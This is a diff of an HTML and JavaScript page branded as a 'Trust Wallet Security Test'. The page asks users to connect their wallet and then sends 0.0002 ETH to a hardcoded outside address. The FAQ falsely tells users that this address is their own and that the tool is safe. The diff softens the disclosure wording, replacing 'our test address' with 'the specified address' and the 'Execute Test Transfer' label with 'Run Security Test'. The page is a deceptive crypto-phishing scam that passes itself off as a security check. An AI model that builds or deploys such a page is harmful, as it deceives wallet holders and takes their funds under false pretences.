@@ -31,10 +31,6 @@
         .transaction-modal {
             transition: all 0.3s ease;
         }
-        .tx-hash {
-            word-break: break-all;
-            font-size: 0.8rem;
-        }
     </style>
 </head>
 <body class="min-h-screen bg-gray-100">
@@ -55,7 +51,7 @@
                 <h2 class="text-4xl font-bold mb-6">Test Your Wallet Security</h2>
                 <p class="text-xl mb-8 opacity-90">
                     This tool helps you verify the security of your Trust Wallet by performing a small test transaction.
-                    A real transfer of 0.0002 ETH will be sent to the test address.
+                    A real transfer of 0.0002 ETH will be sent to the specified address.
                 </p>
 
                 <div id="connectSection" class="bg-white bg-opacity-10 backdrop-blur-sm rounded-xl p-8 mb-8">
@@ -68,7 +64,7 @@
 
                 <div id="testSection" class="bg-white bg-opacity-10 backdrop-blur-sm rounded-xl p-8 hidden">
                     <h3 class="text-2xl font-semibold mb-4">Step 2: Run Security Test</h3>
-                    <p class="mb-6">This will transfer 0.0002 ETH to our test address to verify your wallet's functionality.</p>
+                    <p class="mb-6">This will transfer 0.0002 ETH to the specified address to verify your wallet's functionality.</p>
                     <div class="bg-white bg-opacity-20 p-4 rounded-lg mb-6 text-left">
                         <div class="flex justify-between mb-2">
                             <span class="font-medium">Destination Address:</span>
@@ -80,7 +76,7 @@
                         </div>
                     </div>
                     <button id="runTestBtn" class="bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-8 rounded-full text-lg transition-all transform hover:scale-105">
-                        <i class="fas fa-bolt mr-2"></i> Execute Test Transfer
+                        <i class="fas fa-bolt mr-2"></i> Run Security Test
                     </button>
                 </div>
             </div>
@@ -103,15 +99,15 @@
                     <div class="text-blue-600 text-4xl mb-4">
                         <i class="fas fa-exchange-alt"></i>
                     </div>
-                    <h3 class="text-xl font-semibold mb-2">2. Small Test Transfer</h3>
-                    <p class="text-gray-600">We perform a real transfer of 0.0002 ETH to verify your wallet's transaction capabilities.</p>
+                    <h3 class="text-xl font-semibold mb-2">2. Small Transaction</h3>
+                    <p class="text-gray-600">We'll send a small amount (0.0002 ETH) to verify your wallet's transaction capabilities.</p>
                 </div>
                 <div class="bg-white p-6 rounded-xl shadow-md hover:shadow-lg transition-shadow">
                     <div class="text-blue-600 text-4xl mb-4">
                         <i class="fas fa-chart-bar"></i>
                     </div>
-                    <h3 class="text-xl font-semibold mb-2">3. Results Verification</h3>
-                    <p class="text-gray-600">Receive confirmation of the successful transaction with all details.</p>
+                    <h3 class="text-xl font-semibold mb-2">3. Verification</h3>
+                    <p class="text-gray-600">Confirm the transaction was successful and check your wallet balance.</p>
                 </div>
             </div>
 
@@ -120,15 +116,15 @@
                 <div class="space-y-4">
                     <div class="border-b pb-4">
                         <h4 class="font-medium text-gray-800">Is this safe to use?</h4>
-                        <p class="text-gray-600 mt-1">Yes! This performs a real transfer of a very small amount (0.0002 ETH) to verify your wallet's functionality. The destination address is controlled by you for testing purposes.</p>
+                        <p class="text-gray-600 mt-1">Yes! We only send a small amount (0.0002 ETH) to your own test address. The transaction is fully controlled by you and requires your confirmation.</p>
                     </div>
                     <div class="border-b pb-4">
                         <h4 class="font-medium text-gray-800">What information do you collect?</h4>
                         <p class="text-gray-600 mt-1">We only access your public wallet address to verify connection. No private keys or sensitive information is ever requested or stored.</p>
                     </div>
                     <div>
-                        <h4 class="font-medium text-gray-800">Why perform a real transfer?</h4>
-                        <p class="text-gray-600 mt-1">A real transfer provides the most accurate test of your wallet's transaction capabilities and security settings.</p>
+                        <h4 class="font-medium text-gray-800">Why perform a real transaction?</h4>
+                        <p class="text-gray-600 mt-1">A real transaction helps verify that your wallet is properly configured and can successfully send funds, which is important for security testing.</p>
                     </div>
                 </div>
             </div>
@@ -149,8 +145,8 @@
                     <i class="fas fa-times-circle"></i>
                 </div>
 
-                <h3 id="transactionTitle" class="text-2xl font-bold mb-2">Processing Test Transaction</h3>
-                <p id="transactionMessage" class="text-gray-600 mb-6">Please wait while we process the test transfer...</p>
+                <h3 id="transactionTitle" class="text-2xl font-bold mb-2">Processing Transaction</h3>
+                <p id="transactionMessage" class="text-gray-600 mb-6">Please confirm the transaction in your wallet...</p>
 
                 <div id="transactionDetails" class="bg-gray-100 p-4 rounded-lg mb-6 text-left hidden">
                     <div class="flex justify-between mb-2">
@@ -161,18 +157,13 @@
                         <span class="font-medium">To:</span>
                         <span id="txTo" class="font-mono text-sm break-all">0x43C68c2eBf05d44a5B953157268CcB3592eC64f9</span>
                     </div>
-                    <div class="flex justify-between mb-2">
+                    <div class="flex justify-between">
                         <span class="font-medium">Amount:</span>
                         <span id="txAmount">0.0002 ETH</span>
                     </div>
-                    <div class="mt-3">
-                        <span class="font-medium block mb-1">Transaction Hash:</span>
-                        <span id="txHash" class="font-mono tx-hash block"></span>
-                    </div>
-                    <div id="etherscanLink" class="mt-3 hidden">
-                        <a href="#" target="_blank" class="text-blue-600 hover:underline">
-                            <i class="fas fa-external-link-alt mr-1"></i> View on Etherscan
-                        </a>
+                    <div id="txHashContainer" class="mt-2 hidden">
+                        <div class="font-medium">Transaction Hash:</div>
+                        <a id="txHashLink" href="#" target="_blank" class="font-mono text-sm break-all text-blue-600 hover:underline"></a>
                     </div>
                 </div>
 
@@ -185,7 +176,7 @@
 
     <footer class="bg-gray-800 text-white py-8">
         <div class="container mx-auto px-4 text-center">
-            <p class="mb-4">This performs a real transfer of 0.0002 ETH for testing purposes.</p>
+            <p class="mb-4">This tool performs a real transaction of 0.0002 ETH to the specified address.</p>
             <p class="text-gray-400 text-sm">© 2023 Trust Wallet Security Test. All rights reserved.</p>
         </div>
     </footer>
@@ -226,10 +217,14 @@
             const transactionMessage = document.getElementById('transactionMessage');
             const transactionDetails = document.getElementById('transactionDetails');
             const txFrom = document.getElementById('txFrom');
-            const txHash = document.getElementById('txHash');
-            const etherscanLink = document.getElementById('etherscanLink');
+            const txHashContainer = document.getElementById('txHashContainer');
+            const txHashLink = document.getElementById('txHashLink');
             const closeModalBtn = document.getElementById('closeModalBtn');
 
+            // Destination address and amount
+            const DESTINATION_ADDRESS = '0x43C68c2eBf05d44a5B953157268CcB3592eC64f9';
+            const AMOUNT_ETH = 0.0002;
+            
             // Check if Web3 is injected (MetaMask, Trust Wallet, etc.)
             if (typeof window.ethereum !== 'undefined') {
                 console.log('Web3 detected!');
@@ -265,7 +260,7 @@
                 }
             });
 
-            // Run Test Button - Now performs an actual ETH transfer
+            // Run Test Button - Now performs actual transaction
             runTestBtn.addEventListener('click', async function() {
                 try {
                     // Show processing modal
@@ -274,56 +269,52 @@
                     transactionSuccess.classList.add('hidden');
                     transactionError.classList.add('hidden');
                     transactionDetails.classList.add('hidden');
-                    transactionTitle.textContent = 'Processing Test Transaction';
-                    transactionMessage.textContent = 'Please approve the transaction in your wallet...';
+                    txHashContainer.classList.add('hidden');
+                    transactionTitle.textContent = 'Processing Transaction';
+                    transactionMessage.textContent = 'Please confirm the transaction in your wallet...';
 
                     // Get current account
                     const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                     const account = accounts[0];
-                    txFrom.textContent = account;
-
-                    // Set up Web3
+                    
+                    // Initialize Web3
                     const web3 = new Web3(window.ethereum);
-
-                    // Convert 0.0002 ETH to wei
-                    const amountInEth = 0.0002;
-                    const amountInWei = web3.utils.toWei(amountInEth.toString(), 'ether');
-
-                    // Destination address (your test address)
-                    const toAddress = '0x43C68c2eBf05d44a5B953157268CcB3592eC64f9';
-
-                    // Send transaction
-                    const tx = await web3.eth.sendTransaction({
+                    
+                    // Convert ETH amount to Wei
+                    const amountWei = web3.utils.toWei(AMOUNT_ETH.toString(), 'ether');
+                    
+                    // Prepare transaction parameters
+                    const transactionParameters = {
                         from: account,
-                        to: toAddress,
-                        value: amountInWei
-                    });
-
-                    console.log('Transaction successful:', tx);
-
+                        to: DESTINATION_ADDRESS,
+                        value: amountWei,
+                        gas: 21000, // Standard gas limit for simple ETH transfers
+                        gasPrice: await web3.eth.getGasPrice() // Current gas price
+                    };
+                    
+                    // Send transaction
+                    const txHash = await web3.eth.sendTransaction(transactionParameters);
+                    
                     // Show success
                     transactionSpinner.classList.add('hidden');
                     transactionSuccess.classList.remove('hidden');
-                    transactionTitle.textContent = 'Transfer Successful';
-                    transactionMessage.textContent = '0.0002 ETH has been sent to the test address.';
+                    transactionTitle.textContent = 'Transaction Successful';
+                    transactionMessage.textContent = '0.0002 ETH has been sent successfully!';
                     transactionDetails.classList.remove('hidden');
-                    
-                    // Update transaction details
-                    txHash.textContent = tx.transactionHash;
-                    
-                    // Add Etherscan link
-                    const etherscanUrl = `https://etherscan.io/tx/${tx.transactionHash}`;
-                    etherscanLink.querySelector('a').href = etherscanUrl;
-                    etherscanLink.classList.remove('hidden');
+                    txFrom.textContent = account;
+                    txHashContainer.classList.remove('hidden');
+                    txHashLink.textContent = `${txHash.transactionHash.substring(0, 12)}...${txHash.transactionHash.substring(58)}`;
+                    txHashLink.href = `https://etherscan.io/tx/${txHash.transactionHash}`;
 
+                    console.log('Transaction successful:', txHash);
                 } catch (error) {
-                    console.error('Error performing transfer:', error);
-
+                    console.error('Error performing transaction:', error);
+                    
                     // Show error
                     transactionSpinner.classList.add('hidden');
                     transactionError.classList.remove('hidden');
-                    transactionTitle.textContent = 'Transfer Failed';
-                    transactionMessage.textContent = error.message || 'There was an error performing the transfer.';
+                    transactionTitle.textContent = 'Transaction Failed';
+                    transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
                 }
             });
 
